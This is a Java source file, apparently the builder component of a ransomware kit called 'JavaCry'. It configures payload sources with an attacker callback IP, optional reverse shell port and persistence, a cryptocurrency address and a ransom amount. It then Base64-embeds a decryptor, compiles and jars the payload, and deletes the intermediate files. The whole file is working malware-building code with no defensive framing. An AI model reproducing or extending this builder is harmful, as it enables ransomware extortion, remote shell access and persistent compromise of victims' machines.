import java.io.File;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.lang.ProcessBuilder;
import java.util.ArrayList;
import java.util.Scanner;

public class PayloadBuilder {
    private String workingDir = "../../output/";
    private String payloadDir = "../../Payload/";
    private String path = "";
    private String expPath = "";
    private String IP = "127.0.0.1";
    private String CryptAddress = "[My Address]";
    private boolean useRevShell;
    private boolean usePersistence;
    private int revPort;
    private double cost = 1;


    public PayloadBuilder() {
        useRevShell = false;
        revPort = 9999;
        usePersistence = false;
        path = "";
    }

    public PayloadBuilder(String path, String expPath, String CryptAddress, double cost, boolean useRevShell, boolean usePersistence, String host, int port) {
        this.useRevShell = useRevShell;
        this.usePersistence = usePersistence;
        this.path = path;

        if (expPath.charAt(expPath.length()-1) != '/' && expPath.charAt(expPath.length()-1) != '\\') {
            expPath += "/";
        }
        this.expPath = expPath;
        this.workingDir = expPath;
        IP = host;
        revPort = port;
        this.CryptAddress = CryptAddress;
        this.cost = cost;
    }


    public String getWorkingDir() {
        return workingDir;
    }
    public String getPayloadDir() {
        return payloadDir;
    }

    public String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");

        for (int i = 0; i < lines.length; i++) {
            if (i + 1 == lineno) {
                out += content + "\n";
            }

            else {
                out += lines[i] + "\n";
            }
        }

        return out;
    }

    public void copyAllPayloads(){
        try {
            Files.copy(new FileInputStream(new File(payloadDir + "Decryptor.java")), Paths.get(workingDir, "Decryptor.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "JavaCry.java")), Paths.get(workingDir, "JavaCry.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "KeyClient.java")), Paths.get(workingDir, "KeyClient.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "RSACrypt.java")), Paths.get(workingDir, "RSACrypt.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "manifest.txt")), Paths.get(workingDir, "manifest.txt"), StandardCopyOption.REPLACE_EXISTING);
            
            new File(workingDir + "img").mkdirs();
            Files.copy(new FileInputStream(new File(payloadDir + "img/loading.gif")), Paths.get(workingDir, "img/loading.gif"), StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            System.out.println(e);
        }     
        
    }

    public boolean build() {
        try {
            Base64Tools b64 = new Base64Tools();

            copyAllPayloads();

            String code = new String(Files.readAllBytes(Paths.get(getWorkingDir() + "Decryptor.java")), StandardCharsets.UTF_8);
            code = replaceLine(code, 46, "private static String address = \"" + IP + "\";");
            code = replaceLine(code, 49, "private boolean usingRevShell = " + useRevShell + ";");
            code = replaceLine(code, 50, "private int revPort = " + revPort + ";");
            code = replaceLine(code, 51, "private boolean usePersistence = " + usePersistence + ";");
            code = replaceLine(code, 52, "private String CryptAddress = \"" + CryptAddress + "\";");
            code = replaceLine(code, 53, "private double cost = " + cost + ";");
            code = replaceLine(code, 61, "private static String targetPath = \"" + path + "\";");
            FileWriter writer = new FileWriter(getWorkingDir() + "Decryptor.java");
            writer.write(code);
            writer.close();

            code = new String(Files.readAllBytes(Paths.get(getWorkingDir() + "KeyClient.java")), StandardCharsets.UTF_8);
            code = replaceLine(code, 14, "private static String addr = \"" + IP + "\";");
            writer = new FileWriter(getWorkingDir() + "KeyClient.java");
            writer.write(code);
            writer.close();

            String decryptorPayload = b64.FileToB64(new File(getWorkingDir() + "Decryptor.java"));
            code = new String(Files.readAllBytes(Paths.get(getWorkingDir() + "JavaCry.java")), StandardCharsets.UTF_8);
            code = replaceLine(code, 23, "private static String addr = \"" + IP + "\";");
            code = replaceLine(code, 30, "private static String decryptorPayload = \"" + decryptorPayload + "\";");
            code = replaceLine(code, 24, "private static String targetPath = \"" + path + "\";");
            writer = new FileWriter(getWorkingDir() + "JavaCry.java");
            writer.write(code);
            writer.close();
            return true;
        } catch (Exception e) {
            System.out.println(e);
            return false;
        }
        
    }

    public boolean compile() {
        try {

            Process process = Runtime.getRuntime().exec("javac JavaCry.java -d Classes --release 8", null, new File(workingDir));
            process.waitFor();
            process = Runtime.getRuntime().exec("jar -cvmf ../manifest.txt ../JavaCry.jar JavaCry.class KeyClient.class RSACrypt.class ../img/", null, new File(workingDir + "Classes/"));
            
            StringBuilder output = new StringBuilder();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }
            System.out.println(output);
            
            process.waitFor();

            // String os = System.getProperty("os.name").split(" ")[0];
            // if (os.equals("Linux") || os.equals("Mac OS X")) {
            //     process = Runtime.getRuntime().exec("chmod 777 " + workingDir + "Classes/JavaCry.jar");
            //     process.waitFor();
            // } else {
            //     process = Runtime.getRuntime().exec("cacls" + workingDir + "Classes/JavaCry.jar" + "/g everyone:f");
            //     process.waitFor();
            // }

            Files.copy(new FileInputStream(new File(payloadDir + "Decryptor.java")), Paths.get(workingDir, "Decryptor.java"), StandardCopyOption.REPLACE_EXISTING);

            File decryptor = new File(workingDir + "Decryptor.java");
            File rsacrypt = new File(workingDir + "RSACrypt.java");
            File payload = new File(workingDir + "JavaCry.java");
            File keyclient = new File(workingDir + "KeyClient.java");
            File manifest = new File(workingDir + "manifest.txt");
            File imgDir = new File(workingDir + "img/");
            File clsDir = new File(workingDir + "Classes/");

            decryptor.delete();
            payload.delete();
            keyclient.delete();
            manifest.delete();
            rsacrypt.delete();
            
            File[] folderContent = imgDir.listFiles();
            if (folderContent != null) {
                for (File file : folderContent) {
                    file.delete();
                }
            }
            imgDir.delete();

            folderContent = clsDir.listFiles();
            if (folderContent != null) {
                for (File file : folderContent) {
                    file.delete();
                }
            }
            clsDir.delete();

            return true;
        } catch (Exception e) {
            System.out.println(e);
            return false;
        }
    }

    // public static void main(String[] args) {
    //     PayloadBuilder builder = new PayloadBuilder();
    //     builder.build();
    //     builder.compile();
    // }
}